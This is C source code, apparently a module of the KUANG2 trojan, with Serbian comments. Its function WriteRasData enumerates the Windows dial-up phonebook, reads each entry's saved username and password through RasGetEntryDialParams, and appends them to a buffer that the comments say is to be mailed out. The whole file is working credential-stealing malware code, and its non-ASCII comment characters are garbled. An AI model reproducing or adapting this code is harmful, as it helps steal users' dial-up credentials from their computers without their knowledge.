/***[ThuNderSoft]*************************************************************
						  KUANG2 pSender: WriteRasData
								���� WEIRD ����
*****************************************************************************/

#include <windows.h>
#include <ras.h>
#include <raserror.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

extern char buff[];		// ovde se dodaje ono �to se �alje
extern char temp[];

/*
	WriteRasData
	------------
  � �ita RasPodatke i njih snima u bafer. Ovi podaci su 100% sigurni, ako ih
	uop�te ima.	 Nema ih kada je isklju�eno 'Save Password'. */

BOOL WriteRasData(char *fb)
{
	RASENTRYNAME *rasko;				// ovde smesti ras entry-je (phone-books)
	RASDIALPARAMS rasdata;				// info o pojedina�nom DialUpu
	BOOL ispassget;						// da li je uzet password?
	DWORD entrysize;					// veli�ina ras entryja
	DWORD brojDUP;						// broj upisanih DUPova
	int rezultat;						// interna, sme�ta se rezultat f-ja
	int i;								// interni broja�
	int maxdups;						// ukupan broj dupova
	BOOL retval;
	char wME[]="\r\nwME";
	char eRE[10]="\r\neRE";
	char eRG[8]="\r\neRG";

	retval=FALSE;
	maxdups=entrysize=0;
	rezultat=RasEnumEntries(NULL, NULL, NULL, &entrysize, &brojDUP);
	maxdups=brojDUP;	// Sada maxdups daje ta�an broj zapisa!

	entrysize=sizeof(RASENTRYNAME)*maxdups;			// ukupna veli�ina

	rasko=GlobalAlloc(GMEM_FIXED, entrysize);
	if (rasko==NULL) {
		straddF(buff, wME);
		return FALSE;			// iza�i
	}
	rasko[0].dwSize=sizeof(RASENTRYNAME);	// Prvi entry mora da ima setovan
											// dwSize da bi radilo
	// prebroji mi dial-up ove
	rezultat = RasEnumEntries(NULL, NULL, &rasko[0], &entrysize, &brojDUP);

	if (rezultat == ERROR_BUFFER_TOO_SMALL) {
		straddF(buff, wME);
		GlobalFree(rasko);
		return FALSE;			// iza�i po�to ne�e ni�ta pisati
	} else {
		if (rezultat) {
			straddF(buff, eRE);
			GlobalFree(rasko);
			return FALSE;		// systemska gre�ka
		}
	}

	for (i=0; i<brojDUP; i++) {
		// prvo iskopiraj ime DUP
		strcopyF(rasdata.szEntryName, rasko[i].szEntryName);
		// obavezno za ispravan rad f-je
		rasdata.dwSize=sizeof(RASDIALPARAMS);
		// u�ini ono �to mora�
		rezultat = RasGetEntryDialParams(NULL, &rasdata, &ispassget);
		if (rezultat)
			straddF(buff, eRG);
		else {
			// Nema gre�ke, zapi�i sve �to me zanima: Entry/User/Pass
			strcopyFaddd(temp, rasdata.szUserName, 0x0A0D);
			straddFaddd(temp, rasdata.szPassword, 0x0A0D);

			if (!strfind(fb, temp)) {
				retval=TRUE;				// nije na�ao je podatke
				straddF(fb, temp);			// dodaj ih u fajl bafer

				if (i==0) straddF(buff, "-----\r\n");              // odvoji
				straddFaddd(buff, rasdata.szEntryName, 0x0A0D); // dodaj entry name
				straddFaddd(buff, temp, 0x0A0D);		// dodaj ih i u mail-bafer
			}
		}
	}

	GlobalFree(rasko);	// oslobodi raska da ide ku�i
	return retval;
}
